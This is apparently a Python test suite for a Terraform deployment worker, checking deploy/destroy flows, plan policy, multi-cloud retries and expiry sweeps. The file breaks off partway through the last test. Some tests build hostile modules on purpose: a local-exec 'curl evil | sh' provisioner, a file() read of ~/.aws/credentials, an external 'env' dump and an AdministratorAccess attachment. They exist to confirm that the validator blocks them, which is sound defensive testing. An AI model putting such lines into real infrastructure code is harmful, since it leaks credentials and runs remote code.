"""가짜 terraform + PAWPLOY_OFFLINE=1 로 워커의 전체 흐름을 비용 없이 검증한다.

실행:  python -m unittest -v          (저장소 루트에서)

각 테스트는 워커를 별도 프로세스(python -m tfworker ...)로 띄운다.
작업 폴더는 임시 디렉터리를 쓰고, 헬스체크는 환경변수로 몇 초로 줄인다.
"""
import http.server
import json
import os
import shutil
import subprocess
import sys
import tempfile
import threading
import time
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
FAKE_TF = ROOT / "tools" / "fake-terraform.py"
FAKE_AWS = ROOT / "tools" / "fake-aws.py"


def _iso(minutes_ago: int) -> str:
    return time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() - minutes_ago * 60))


def _fake_bin(tmp: Path, script: Path, name: str) -> str:
    """shutil.which 가 찾을 수 있는 실행 파일 경로를 돌려준다 (Windows 는 .cmd 래퍼)."""
    if os.name == "nt":
        wrapper = tmp / f"{name}.cmd"
        wrapper.write_text(f'@"{sys.executable}" "{script}" %*\r\n', encoding="utf-8")
        return str(wrapper)
    return str(script)


class _Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        body = b'{"message":"Hello from fake app"}'
        self.send_response(200)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *_):  # 테스트 출력 조용히
        pass


class WorkerFlowTest(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), _Handler)
        threading.Thread(target=cls.server.serve_forever, daemon=True).start()
        cls.healthy_endpoint = f"http://127.0.0.1:{cls.server.server_address[1]}"

    @classmethod
    def tearDownClass(cls):
        cls.server.shutdown()

    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix="pawploy-test-"))
        self.work = self.tmp / "work"
        self.addCleanup(shutil.rmtree, self.tmp, ignore_errors=True)
        self.base_env = {
            **os.environ,
            "PAWPLOY_OFFLINE": "1",
            "PAWPLOY_WORK_DIR": str(self.work),
            "TERRAFORM_BIN": _fake_bin(self.tmp, FAKE_TF, "terraform"),
            "PAWPLOY_HEALTH_TIMEOUT": "3",
            "PAWPLOY_HEALTH_INTERVAL": "1",
            "FAKE_TF_ENDPOINT": self.healthy_endpoint,
        }
        for k in ("FAKE_TF_FAIL", "FAKE_TF_FAIL_CLOUD", "PAWPLOY_STATUS_TABLE"):
            self.base_env.pop(k, None)
        self.base_env.pop("PAWPLOY_STATE_BUCKET", None)
        self.base_env.pop("PAWPLOY_ARTIFACT_BUCKET", None)

    # ---------- 도우미 ----------

    def run_worker(self, *args, **env):
        p = subprocess.run([sys.executable, "-m", "tfworker", *args], cwd=ROOT,
                           env={**self.base_env, "PYTHONIOENCODING": "utf-8", **env}, capture_output=True, text=True,
                           encoding="utf-8", errors="replace")
        return p.returncode, p.stdout + p.stderr

    def write_job(self, name="job.json", **overrides) -> str:
        job = {
            "deploy_id": "dep-test-ec2",
            "project_id": "prj_test",
            "architecture": "ec2",
            "image_uri": "123456789012.dkr.ecr.ap-northeast-2.amazonaws.com/pawploy-sample:latest",
            "container_port": 8080,
            "size": "small",
            "health_path": "/",
            "env": {"APP_MODE": "test"},
        }
        job.update(overrides)
        path = self.tmp / name
        path.write_text(json.dumps(job), encoding="utf-8")
        return str(path)

    def write_targets(self, targets, name="job.json", deploy_id="dep-multi", **overrides) -> str:
        """targets 형식(21단계 입력)의 작업 파일."""
        job = {"deploy_id": deploy_id, "project_id": "prj_test", "container_port": 8080, "size": "small",
               "health_path": "/", "env": {"APP_MODE": "test"}, "targets": targets, **overrides}
        path = self.tmp / name
        path.write_text(json.dumps(job), encoding="utf-8")
        return str(path)

    def result(self, deploy_id="dep-test-ec2") -> dict:
        return json.loads((self.work / deploy_id / "result.json").read_text(encoding="utf-8"))

    def target(self, cloud="aws", deploy_id="dep-test-ec2") -> dict:
        return self.result(deploy_id)["targets"][cloud]

    def tdir(self, cloud="aws", deploy_id="dep-test-ec2") -> Path:
        return self.work / deploy_id / cloud

    def module_dir(self, src="ec2", extra="") -> str:
        """AgentCore 가 S3 에 저장한 모듈을 흉내 낸 로컬 폴더 (terraform_uri 로 넘긴다)."""
        dst = self.tmp / f"agentcore-{src}-{len(list(self.tmp.glob('agentcore-*')))}"
        shutil.copytree(ROOT / "modules" / src, dst)
        if extra:
            (dst / "main.tf").write_text((dst / "main.tf").read_text(encoding="utf-8") + extra, encoding="utf-8")
        return str(dst)

    def aws_env(self, **extra) -> dict:
        """가짜 aws CLI 를 쓰는 환경 (PAWPLOY_OFFLINE 을 꺼서 AWS 호출 단계가 실제로 돌게 함)."""
        self.aws_log = self.tmp / "aws.jsonl"
        self.aws_db, self.aws_sqs = self.tmp / "dynamodb.json", self.tmp / "sqs.json"
        return {"PAWPLOY_OFFLINE": "", "AWS_BIN": _fake_bin(self.tmp, FAKE_AWS, "aws"),
                "FAKE_AWS_LOG": str(self.aws_log), "FAKE_AWS_DB": str(self.aws_db),
                "FAKE_AWS_SQS": str(self.aws_sqs), **extra}

    def db(self) -> dict:
        return json.loads(self.aws_db.read_text(encoding="utf-8")) if self.aws_db.exists() else {}

    def aws_calls(self, service: str, op: str) -> list[list[str]]:
        if not self.aws_log.exists():
            return []
        calls = [json.loads(line) for line in self.aws_log.read_text(encoding="utf-8").splitlines()]
        return [c for c in calls if c[:2] == [service, op]]

    # ---------- 단일 클라우드 (AWS, 이전 입력 형식) ----------

    def test_deploy_then_destroy_ok(self):
        code, out = self.run_worker("deploy", self.write_job())
        self.assertEqual(code, 0, out)
        r = self.result()
        self.assertEqual(r["status"], "running")
        self.assertEqual(r["targets"]["aws"]["endpoint"], self.healthy_endpoint)
        self.assertEqual(r["targets"]["aws"]["resource_id"], "i-0fake000000000000")

        wd = self.tdir()
        self.assertTrue((wd / "modules" / "app" / "main.tf").exists(), "모듈이 작업 폴더에 복사되어야 함")
        tfvars = json.loads((wd / "terraform.tfvars.json").read_text(encoding="utf-8"))
        self.assertEqual(tfvars["env"], {"APP_MODE": "test"})
        self.assertEqual(tfvars["region"], "ap-northeast-2", "region 은 이미지 주소에서 추출")
        main_tf = (wd / "main.tf").read_text(encoding="utf-8")
        self.assertIn('source         = "./modules/app"', main_tf)
        self.assertIn('"pawploy:managed"    = "true"', main_tf, "필수 태그는 워커가 루트에서 붙인다")

        code, out = self.run_worker("destroy", "dep-test-ec2")
        self.assertEqual(code, 0, out)
        self.assertEqual(self.result()["status"], "destroyed")
        self.assertEqual(self.target()["current_state"], [])

    def test_apply_failure_reports_stage_log_and_state(self):
        # 22단계: 실패 단계·오류 로그·현재 상태. apply 를 시작했으면 지운 뒤 보고한다
        code, out = self.run_worker("deploy", self.write_job(), FAKE_TF_FAIL="apply")
        self.assertEqual(code, 1, out)
        t = self.target()
        self.assertEqual(t["status"], "failed")
        self.assertEqual(t["failed_stage"], "apply")
        self.assertIn("InvalidParameterValue", t["log_tail"])
        self.assertTrue(t["destroyed"], "apply 실패 후 자동 destroy 가 돌아야 함")
        self.assertEqual(t["current_state"], [], "정리 뒤 남은 리소스 없음")

    def test_unhealthy_is_cleaned_and_retry_is_possible(self):
        # 응답이 없어도 정리 후 failed 로 보고 → 수정본으로 같은 deploy_id 를 바로 다시 요청할 수 있어야 함 (21~25 루프)
        job = self.write_job()
        code, out = self.run_worker("deploy", job, FAKE_TF_ENDPOINT="http://127.0.0.1:9")
        self.assertEqual(code, 1, out)
        t = self.target()
        self.assertEqual((t["status"], t["failed_stage"], t["destroyed"]), ("failed", "health_check", True))
        self.assertIn("응답하지 않음", t["error"])

        code, out = self.run_worker("deploy", job)
        self.assertEqual(code, 0, out)
        self.assertEqual(self.target()["status"], "running")

    def test_init_failure_leaves_no_resources_and_id_reusable(self):
        job = self.write_job()
        code, out = self.run_worker("deploy", job, FAKE_TF_FAIL="init")
        self.assertEqual(code, 1, out)
        t = self.target()
        self.assertEqual((t["status"], t["failed_stage"], t["destroyed"]), ("failed", "init", False))

        code, out = self.run_worker("deploy", job)
        self.assertEqual(code, 0, out)
        self.assertEqual(self.result()["status"], "running")

    def test_policy_violation_blocks_apply(self):
        cases = {
            "instance_type": dict(FAKE_TF_INSTANCE_TYPE="t3.xlarge"),
            "resource_type": dict(FAKE_TF_EXTRA_RESOURCE="aws_s3_bucket"),
        }
        for name, env in cases.items():
            with self.subTest(case=name):
                deploy_id = f"dep-pol-{name.replace('_', '-')}"
                code, out = self.run_worker("deploy", self.write_job(deploy_id=deploy_id), **env)
                self.assertEqual(code, 1, out)
                t = self.target(deploy_id=deploy_id)
                self.assertEqual((t["status"], t["failed_stage"], t["destroyed"]), ("failed", "plan", False))
                self.assertIn("plan 정책 위반", t["error"])
                self.assertNotIn("Apply complete", out, "정책 위반이면 apply 가 실행되면 안 됨")

    def test_input_errors_return_2(self):
        gcp_tag_image = "asia-northeast3-docker.pkg.dev/pawploy-demo/pawploy/sample:latest"
        cases = {
            "size": dict(size="xlarge"),
            "architecture": dict(architecture="ecs_fargate"),
            "image_uri": dict(image_uri="docker.io/library/nginx:latest"),
            "deploy_id": dict(deploy_id="Bad_ID"),
            "env": dict(env={"1BAD": "x"}),
            "lambda_region": dict(architecture="lambda", region="us-east-1"),   # 이미지는 ap-northeast-2
            "cloud": dict(targets=[{"cloud": "azure", "image_uri": "x"}]),
            "gcp_needs_digest": dict(targets=[{"cloud": "gcp", "image_uri": gcp_tag_image}]),
            "gcp_architecture": dict(targets=[{"cloud": "gcp", "architecture": "ec2", "image_uri": GCP_IMAGE}]),
            "duplicate_cloud": dict(targets=[{"cloud": "gcp", "image_uri": GCP_IMAGE}] * 2),
            "terraform_uri": dict(terraform_uri="s3://x"),
        }
        for name, bad in cases.items():
            with self.subTest(field=name):
                code, out = self.run_worker("deploy", self.write_job(f"bad-{name}.json", **bad))
                self.assertEqual(code, 2, out)
                self.assertIn("입력 오류", out)

    def test_redeploy_same_id_is_rejected_while_running(self):
        job = self.write_job()
        self.assertEqual(self.run_worker("deploy", job)[0], 0)

        code, out = self.run_worker("deploy", job)
        self.assertEqual(code, 2, out)
        self.assertIn("이미 사용 중인 deploy_id", out)
        self.assertEqual(self.result()["status"], "running", "기존 결과가 덮어써지면 안 됨")

        self.assertEqual(self.run_worker("destroy", "dep-test-ec2")[0], 0)
        self.assertEqual(self.run_worker("deploy", job)[0], 0, "destroy 뒤에는 같은 id 재사용 가능")

    def test_redeploy_after_failure_starts_with_clean_result(self):
        job = self.write_job()
        self.assertEqual(self.run_worker("deploy", job, FAKE_TF_FAIL="apply")[0], 1)
        self.assertIn("error", self.target())

        code, out = self.run_worker("deploy", job)
        self.assertEqual(code, 0, out)
        t = self.target()
        self.assertEqual(t["status"], "running")
        for stale in ("error", "log_tail", "failed_stage", "destroyed"):
            self.assertNotIn(stale, t, f"이전 배포의 {stale} 가 남으면 안 됨")

    def test_job_and_recommendation_with_bom_are_accepted(self):
        rec = self.tmp / "rec-bom.json"
        rec.write_text(json.dumps({"architecture": "ec2", "container_port": 3000}), encoding="utf-8-sig")
        job_path = self.tmp / "job-bom.json"
        job_path.write_text(json.dumps({
            "deploy_id": "dep-test-ec2", "project_id": "prj_test",
            "image_uri": AWS_IMAGE, "recommendation_uri": str(rec),
        }), encoding="utf-8-sig")

        code, out = self.run_worker("deploy", str(job_path))
        self.assertEqual(code, 0, out)
        tfvars = json.loads((self.tdir() / "terraform.tfvars.json").read_text(encoding="utf-8"))
        self.assertEqual(tfvars["container_port"], 3000)

    def test_destroy_without_state_is_refused(self):
        # state 없이 destroy 하면 terraform 은 "지울 것 없음"으로 성공해 버린다 → 거부해야 함
        self.assertEqual(self.run_worker("deploy", self.write_job())[0], 0)
        (self.tdir() / "terraform.tfstate").unlink()

        code, out = self.run_worker("destroy", "dep-test-ec2")
        self.assertEqual(code, 1, out)
        self.assertEqual(self.target()["status"], "destroy_failed")
        self.assertIn("state", self.target()["error"])

    def test_destroy_unknown_id_returns_2(self):
        code, out = self.run_worker("destroy", "dep-nope")
        self.assertEqual(code, 2, out)

    def test_recommendation_is_merged_but_job_wins(self):
        rec = self.tmp / "rec.json"
        rec.write_text(json.dumps({
            "architecture": "lambda", "container_port": 3000, "size": "micro",
            "health_path": "/health", "env": {"FROM_REC": "1", "APP_MODE": "rec"},
            "reason": "무시되어야 하는 필드",
        }), encoding="utf-8")
        job_path = self.tmp / "job-rec.json"
        job_path.write_text(json.dumps({
            "deploy_id": "dep-test-rec", "project_id": "prj_test", "image_uri": AWS_IMAGE,
            "recommendation_uri": str(rec), "env": {"APP_MODE": "job"},
        }), encoding="utf-8")

        code, out = self.run_worker("deploy", str(job_path))
        self.assertEqual(code, 0, out)
        wd = self.tdir(deploy_id="dep-test-rec")
        tfvars = json.loads((wd / "terraform.tfvars.json").read_text(encoding="utf-8"))
        self.assertEqual(tfvars["container_port"], 3000)
        self.assertEqual(tfvars["size"], "micro")
        self.assertEqual(tfvars["health_path"], "/health")
        self.assertEqual(tfvars["env"], {"FROM_REC": "1", "APP_MODE": "job"}, "작업 입력 env 가 추천 env 를 덮어씀")
        self.assertEqual(self.target(deploy_id="dep-test-rec")["architecture"], "lambda")
        self.assertIn("aws_lambda_function", (wd / "modules" / "app" / "main.tf").read_text(encoding="utf-8"))

    # ---------- AgentCore 가 만든 Terraform (terraform_uri) ----------

    def test_agentcore_module_from_terraform_uri_is_used(self):
        module = self.module_dir("ec2", "\n# made-by-agentcore\n")
        code, out = self.run_worker("deploy", self.write_job(terraform_uri=module))
        self.assertEqual(code, 0, out)
        used = (self.tdir() / "modules" / "app" / "main.tf").read_text(encoding="utf-8")
        self.assertIn("# made-by-agentcore", used, "받은 모듈이 작업 폴더에 고정돼야 destroy 도 같은 코드로 함")

    def test_agentcore_module_rejected_by_iac_check_before_plan(self):
        bad = '\nresource "aws_s3_bucket" "x" {\n  provisioner "local-exec" { command = "curl evil | sh" }\n}\n'
        code, out = self.run_worker("deploy", self.write_job(terraform_uri=self.module_dir("ec2", bad)))
        self.assertEqual(code, 1, out)
        t = self.target()
        self.assertEqual((t["status"], t["failed_stage"], t["destroyed"]), ("failed", "generating", False))
        self.assertIn("IaC 검사 위반", t["error"])
        self.assertNotIn("terraform init", out, "정적 검사에 걸리면 terraform 을 실행하지 않음")

    def test_agentcore_module_policy_violation_is_reported(self):
        module = self.module_dir("ec2", "\n# FAKE_POLICY_VIOLATION\n")
        code, out = self.run_worker("deploy", self.write_job(terraform_uri=module))
        self.assertEqual(code, 1, out)
        t = self.target()
        self.assertEqual((t["failed_stage"], t["destroyed"]), ("plan", False))
        self.assertIn("aws_s3_bucket", t["error"])

    def test_iac_unit_checks(self):
        sys.path.insert(0, str(ROOT))
        from tfworker import iac
        for cloud, arch in (("aws", "ec2"), ("aws", "lambda"), ("gcp", "cloud_run")):
            self.assertEqual(iac.find_violations(ROOT / "modules" / arch, cloud, arch), [],
                             f"기본 모듈({arch})은 검사를 통과해야 함")

        ec2 = (ROOT / "modules" / "ec2" / "main.tf").read_text(encoding="utf-8")
        bad = ec2.replace('output "endpoint"', 'output "url"') + """
data "external" "x" { program = ["sh", "-c", "env"] }
data "aws_secretsmanager_secret_version" "s" { secret_id = "team" }
data "aws_ssm_parameter" "secret" {
  name = "/pawploy/db-password"
}
provider "aws" { alias = "other" }
resource "aws_s3_bucket" "b" {}
resource "aws_iam_role_policy_attachment" "admin" {
  role       = aws_iam_role.app.name
  policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"
}
locals {
  leak1 = file("~/.aws/credentials")
  leak2 = templatefile("${path.module}/../../secret.tftpl", {})
}
"""
        joined = "\n".join(iac.check_code(bad, "aws", "ec2"))
        for expected in ("data 소스: external", "aws_secretsmanager_secret_version", "/aws/service/", "provider 블록",
                         "aws_s3_bucket", "AdministratorAccess", "출력 누락: endpoint", "file()", "templatefile()"):
            self.assertIn(expected, joined)

        run = (ROOT / "modules" / "cloud_run" / "main.tf").read_text(encoding="utf-8")
        joined = "\n".join(iac.check_code(
            run.replace("deletion_protection = false", "deletion_protection = true")
            + '\nlocals { t = data.google_client_config.current.access_token }\n'
            + 'resource "google_project_iam_member" "x" {}\n', "gcp", "cloud_run"))
        for expected in ("deletion_protection", "access_token", "google_project_iam_member"):
            self.assertIn(expected, joined)

    # ---------- GCP / 멀티 클라우드 ----------

    def test_gcp_cloud_run_deploy_and_destroy(self):
        job = self.write_targets([{"cloud": "gcp", "image_uri": GCP_IMAGE}], deploy_id="dep-gcp")
        code, out = self.run_worker("deploy", job)
        self.assertEqual(code, 0, out)
        t = self.target("gcp", "dep-gcp")
        self.assertEqual((t["status"], t["architecture"]), ("running", "cloud_run"))

        wd = self.tdir("gcp", "dep-gcp")
        main_tf = (wd / "main.tf").read_text(encoding="utf-8")
        self.assertIn('provider "google"', main_tf)
        self.assertNotIn('provider "aws"', main_tf)
        tfvars = json.loads((wd / "terraform.tfvars.json").read_text(encoding="utf-8"))
        self.assertEqual((tfvars["gcp_project"], tfvars["region"]), ("pawploy-demo", "asia-northeast3"),
                         "프로젝트·리전은 Artifact Registry 주소에서 추출")
        labels = tfvars["labels"]
        self.assertEqual(set(labels), {"pawploy-managed", "pawploy-project-id", "pawploy-deploy-id", "pawploy-expires-at"})
        for v in labels.values():
            self.assertRegex(v, r"^[a-z0-9_-]{1,63}$", "GCP label 값 형식")

        self.assertEqual(self.run_worker("destroy", "dep-gcp")[0], 0)
        self.assertEqual(self.result("dep-gcp")["status"], "destroyed")

    def test_multi_cloud_partial_failure_keeps_success_and_retries_failed_only(self):
        targets = [{"cloud": "aws", "architecture": "ec2", "image_uri": AWS_IMAGE},
                   {"cloud": "gcp", "image_uri": GCP_IMAGE}]
        code, out = self.run_worker("deploy", self.write_targets(targets),
                                    FAKE_TF_FAIL="apply", FAKE_TF_FAIL_CLOUD="gcp")
        self.assertEqual(code, 1, out)
        r = self.result("dep-multi")
        self.assertEqual(r["status"], "partial")
        self.assertEqual(r["targets"]["aws"]["status"], "running", "성공한 쪽은 유지")
        g = r["targets"]["gcp"]
        self.assertEqual((g["status"], g["failed_stage"], g["destroyed"], g["current_state"]),
                         ("failed", "apply", True, []))
        first_expiry = r["expires_at"]

        # 살아 있는 AWS 까지 다시 보내면 거부 (덮어쓰기 방지)
        code, out = self.run_worker("deploy", self.write_targets(targets, name="again.json"))
        self.assertEqual(code, 2, out)
        self.assertIn("aws status=running", out)

        # 23~25 수정 뒤 실패한 GCP 만 다시 요청 → 전체 running, 만료 시각은 늘어나지 않음
        time.sleep(1)
        code, out = self.run_worker("deploy", self.write_targets([targets[1]], name="retry.json"))
        self.assertEqual(code, 0, out)
        r = self.result("dep-multi")
        self.assertEqual(r["status"], "running")
        self.assertEqual(r["expires_at"], first_expiry, "재시도로 1시간 제한이 늘어나면 안 됨")

        # 클라우드 하나만 삭제
        self.assertEqual(self.run_worker("destroy", "dep-multi", "aws")[0], 0)
        r = self.result("dep-multi")
        self.assertEqual((r["targets"]["aws"]["status"], r["targets"]["gcp"]["status"], r["status"]),
                         ("destroyed", "running", "partial"))
        self.assertEqual(self.run_worker("destroy", "dep-multi")[0], 0)
        self.assertEqual(self.result("dep-multi")["status"], "destroyed")

    def test_policy_unit_checks(self):
        sys.path.insert(0, str(ROOT))
        from tfworker import policy

        def plan(*changes):
            return {"resource_changes": list(changes)}

        def change(rtype, after=None, actions=("create",), mode="managed"):
            return {"address": f"module.app.{rtype}.x", "mode": mode, "type": rtype,
                    "change": {"actions": list(actions), "after": after or {}}}

        ok_tags = {"tags_all": {t: "v" for t in policy.REQUIRED_TAGS}}
        self.assertEqual(policy.find_violations(plan(change("aws_instance", {"instance_type": "t3.micro", **ok_tags})), "ec2"), [])
        self.assertEqual(policy.find_violations(plan(change("aws_vpc", mode="data")), "ec2"), [], "data 소스는 무시")
        self.assertEqual(policy.find_violations(plan(change("aws_instance", actions=("no-op",))), "ec2"), [])

        v = "\n".join(policy.find_violations(plan(
            change("aws_instance", {"instance_type": "m5.large", "tags_all": {"pawploy:managed": "true"}}),
            change("aws_lambda_function", {"memory_size": 4096, "timeout": 900}),   # ec2 배포에 Lambda 는 허용 밖
            change("aws_security_group", {"ingress": [{"from_port": 22, "to_port": 22}], **ok_tags}),
            change("aws_iam_role", actions=("delete",)),
            change("aws_iam_role_policy_attachment", {"policy_arn": "arn:aws:iam::aws:policy/AdministratorAccess"}),
            change("aws_instance", {"instance_type": "t3.micro", "credit_specification": [], **ok_tags}),
        ), "ec2"))
        for expected in ("인스턴스 타입 m5.large", "필수 태그 누락", "허용하지 않는 리소스 종류 aws_lambda_function",
                         "인바운드 포트 22-22", "삭제", "AdministratorAccess", "CPU 크레딧"):
            self.assertIn(expected, v)

        labels = {"terraform_labels": {k: "v" for k in policy.REQUIRED_LABELS}}
        good_run = {"deletion_protection": False, **labels,
                    "template": [{"scaling": [{"max_instance_count": 1}],
                                  "service_account": "pp-x@proj-1234.iam.gserviceaccount.com",
                                  "containers": [{"resources": [{"limits": {"memory": "1Gi"}}]}]}]}
        self.assertEqual(policy.find_violations(plan(change("google_service_account", {"account_id": "pp-x"}),
                                                     change("google_cloud_run_v2_service", good_run)), "cloud_run"), [])
        v = "\n".join(policy.find_violations(plan(
            change("google_cloud_run_v2_service", {
                "deletion_protection": True, "terraform_labels": {},
                "template": [{"scaling": [{"max_instance_count": 50}],
                              "containers": [{"resources": [{"limits": {"memory": "8Gi"}}]}]}]}),
            change("google_cloud_run_v2_service_iam_member", {"role": "roles/run.admin", "member": "allUsers"}),
            change("google_project_iam_member", {}),
        ), "cloud_run"))
        for expected in ("deletion_protection", "최대 인스턴스 수 50", "8Gi", "roles/run.admin", "필수 label 누락",
                         "google_project_iam_member"):
            self.assertIn(expected, v)

    # ---------- AWS 호출 (가짜 aws CLI) ----------

    def test_image_is_pinned_to_digest_and_status_goes_to_dynamodb(self):
        env = self.aws_env(PAWPLOY_STATUS_TABLE="pawploy-deployments", PAWPLOY_ARTIFACT_BUCKET="bkt")
        code, out = self.run_worker("deploy", self.write_job(), **env)
        self.assertEqual(code, 0, out)

        tfvars = json.loads((self.tdir() / "terraform.tfvars.json").read_text(encoding="utf-8"))
        self.assertEqual(tfvars["image_uri"],
                         "123456789012.dkr.ecr.ap-northeast-2.amazonaws.com/pawploy-sample@sha256:" + "a" * 64)
        self.assertEqual(len(self.aws_calls("ecr", "describe-images")), 1)

        sync = self.aws_calls("s3", "sync")
        self.assertEqual(len(sync), 1, "정책 검사 뒤 한 번만 보관")
        self.assertIn("s3://bkt/workdirs/dep-test-ec2/aws/", sync[0])
        for excluded in ("*.tfstate", "result.json", "plan.json"):
            self.assertIn(excluded, sync[0])

        puts = self.aws_calls("dynamodb", "put-item")
        items = [json.loads(c[c.index("--item") + 1]) for c in puts]
        statuses = [i["status"]["S"] for i in items if "status" in i]   # 잠금 항목(kind=lock)은 제외
        self.assertTrue(any(i.get("kind") == {"S": "lock"} for i in items), "배포 중에는 잠금을 잡아야 함")
        self.assertNotIn("lock#dep-test-ec2", self.db(), "끝나면 잠금을 풀어야 함")
        self.assertEqual(statuses[0], "deploying")
        self.assertEqual(statuses[-1], "running")
        last = json.loads(puts[-1][puts[-1].index("--item") + 1])
        self.assertEqual(last["deploy_id"], {"S": "dep-test-ec2"})
        self.assertEqual(last["project_id"], {"S": "prj_test"})
        self.assertEqual(last["targets"]["M"]["aws"]["M"]["endpoint"], {"S": self.healthy_endpoint})
        self.assertIn("--region", puts[-1])

    def test_missing_image_is_reported_before_terraform(self):
        code, out = self.run_worker("deploy", self.write_job(), **self.aws_env(FAKE_AWS_ECR_MISSING="1"))
        self.assertEqual(code, 1, out)
        t = self.target()
        self.assertEqual((t["status"], t["failed_stage"]), ("failed", "preparing"))
        self.assertFalse((self.tdir() / "main.tf").exists(), "이미지가 없으면 Terraform 생성 전에 멈춤")

    # ---------- 만료 정리 ----------

    def _set_result(self, deploy_id: str, **fields) -> None:
        path = self.work / deploy_id / "result.json"
        path.parent.mkdir(parents=True, exist_ok=True)
        current = json.loads(path.read_text(encoding="utf-8")) if path.exists() else {"deploy_id": deploy_id}
        path.write_text(json.dumps({**current, **fields}), encoding="utf-8")

    def test_sweep_destroys_only_expired(self):
        self.assertEqual(self.run_worker("deploy", self.write_job(deploy_id="dep-old"))[0], 0)
        self.assertEqual(self.run_worker("deploy", self.write_job(deploy_id="dep-new"))[0], 0)
        self._set_result("dep-old", expires_at="2000-01-01T00:00:00Z")
        # 배포 중 상태로 방금 만료된 것은 다른 프로세스가 작업 중일 수 있어 건너뛰고, 한참 지난 것은 잡는다
        self._set_result("dep-busy-recent", status="deploying", expires_at=_iso(minutes_ago=1))
        self._set_result("dep-busy-stale", status="deploying", expires_at=_iso(minutes_ago=30))

        code, out = self.run_worker("sweep", "--dry-run")
        self.assertEqual(code, 0, out)
        self.assertIn("dep-old", out)
        self.assertIn("dep-busy-stale", out)
        self.assertNotIn("dep-new", out)
        self.assertNotIn("dep-busy-recent", out)
        self.assertEqual(self.result("dep-old")["status"], "running", "dry-run 은 지우지 않음")

        code, out = self.run_worker("sweep")
        self.assertEqual(code, 1, out + "\n(dep-busy-stale 은 작업 폴더가 없어 삭제 실패해야 함)")
        self.assertEqual(self.result("dep-old")["status"], "destroyed")
        self.assertEqual(self.result("dep-new")["status"], "running")

        code, out = self.run_worker("sweep")
        self.assertEqual(code, 1, out)
        self.assertNotIn("dep-old", out, "destroyed 는 다시 잡히면 안 됨")

    def test_sweep_reads_expired_from_dynamodb(self):
        items = [{"deploy_id": {"S": "dep-remote"}, "status": {"S": "partial"},
                  "expires_at": {"S": "2000-01-01T00:00:00Z"}}]
        env = self.aws_env(PAWPLOY_STATUS_TABLE="t", FAKE_AWS_SCAN_ITEMS=json.dumps(items))
        code, out = self.run_worker("sweep", "--dry-run", **env)
        self.assertEqual(code, 0, out)
        self.assertIn("dep-remote", out)
        self.assertIn("(dynamodb)", out)
        scan = self.aws_calls("dynamodb", "scan")
        self.assertEqual(len(scan), 1)
        self.assertIn("--filter-expression", scan[0])

    def test_orphans_lists_expired_tagged_resources(self):
        tagged = [
            {"ResourceARN": "arn:aws:ec2:ap-northeast-2:123456789012:instance/i-old",
             "Tags": [{"Key": "pawploy:managed", "Value": "true"}, {"Key": "pawploy:deploy_id", "Value": "dep-old"},
                      {"Key": "pawploy:expires_at", "Value": "2000-01-01T00:00:00Z"}]},
            {"ResourceARN": "arn:aws:ec2:ap-northeast-2:123456789012:instance/i-new",
             "Tags": [{"Key": "pawploy:managed", "Value": "true"}, {"Key": "pawploy:deploy_id", "Value": "dep-new"},
                      {"Key": "pawploy:expires_at", "Value": "2999-01-01T00:00:00Z"}]},
        ]
        code, out = self.run_worker("orphans", **self.aws_env(FAKE_AWS_TAGGED=json.dumps(tagged)))
        self.assertEqual(code, 1, out)
        self.assertIn("i-old", out)
        self.assertNotIn("i-new", out)
        self.assertIn("삭제하지 않았습니다", out)

        code, out = self.run_worker("orphans", "us-east-1", **self.aws_env(FAKE_AWS_TAGGED="[]"))
        self.assertEqual(code, 0, out)
        self.assertIn("--region", self.aws_calls("resourcegroupstaggingapi", "get-resources")[0])

    def test_expire_schedule_rendered_only_for_aws_with_queue_and_role(self):
        job = self.write_job()
        self.assertEqual(self.run_worker("deploy", job)[0], 0)
        wd = self.tdir()
        self.assertNotIn("aws_scheduler_schedule", (wd / "main.tf").read_text(encoding="utf-8"))
        self.assertEqual(self.run_worker("destroy", "dep-test-ec2")[0], 0)

        sched = dict(PAWPLOY_DESTROY_QUEUE_ARN="arn:aws:sqs:ap-northeast-2:123456789012:pawploy-destroy",
                     PAWPLOY_SCHEDULER_ROLE_ARN="arn:aws:iam::123456789012:role/pawploy-scheduler")
        code, out = self.run_worker("deploy", job, **sched)
        self.assertEqual(code, 0, out)
        self.assertIn('resource "aws_scheduler_schedule" "expire"', (wd / "main.tf").read_text(encoding="utf-8"))
        tfvars = json.loads((wd / "terraform.tfvars.json").read_text(encoding="utf-8"))
        self.assertTrue(tfvars["destroy_queue_arn"].endswith(":pawploy-destroy"))

        gcp = self.write_targets([{"cloud": "gcp", "image_uri": GCP_IMAGE}], name="gcp.json", deploy_id="dep-gcp")
        self.assertEqual(self.run_worker("deploy", gcp, **sched)[0], 0)
        self.assertNotIn("aws_scheduler_schedule", (self.tdir("gcp", "dep-gcp") / "main.tf").read_text(encoding="utf-8"))

    # ---------- 연동: 입력 오류 기록 · 잠금 · 결과 이어받기 · 만료 큐 ----------

    def test_input_error_is_recorded_for_main_server(self):
        code, out = self.run_worker("deploy", self.write_job(size="xlarge"))
        self.assertEqual(code, 2, out)
        r = self.result()
        self.assertEqual((r["status"], r["targets"]), ("rejected", {}))
        self.assertIn("허용되지 않는 크기", r["error"])

        code, out = self.run_worker("deploy", self.write_job())
        self.assertEqual(code, 0, out)
        r = self.result()
        self.assertEqual(r["status"], "running")
        self.assertNotIn("error", r, "받아들여진 뒤에는 이전 거부 기록이 남으면 안 됨")

    def test_rejection_of_active_deploy_keeps_its_status(self):
        job = self.write_job()
        self.assertEqual(self.run_worker("deploy", job)[0], 0)
        self.assertEqual(self.run_worker("deploy", job)[0], 2)
        r = self.result()
        self.assertEqual(r["status"], "running", "거부 기록이 살아 있는 배포 상태를 덮으면 안 됨")
        self.assertIn("이미 사용 중인 deploy_id", r["last_rejection"]["error"])
        self.assertEqual(self.target()["status"], "running")

    def test_lock_blocks_concurrent_work_until_lease_expires(self):
        env = self.aws_env(PAWPLOY_STATUS_TABLE="t")
        held = {"deploy_id": {"S": "lock#dep-test-ec2"}, "kind": {"S": "lock"}, "owner": {"S": "other-worker"},
                "lease_until": {"N": str(int(time.time()) + 600)}}
        self.aws_db.write_text(json.dumps({"lock#dep-test-ec2": held}), encoding="utf-8")

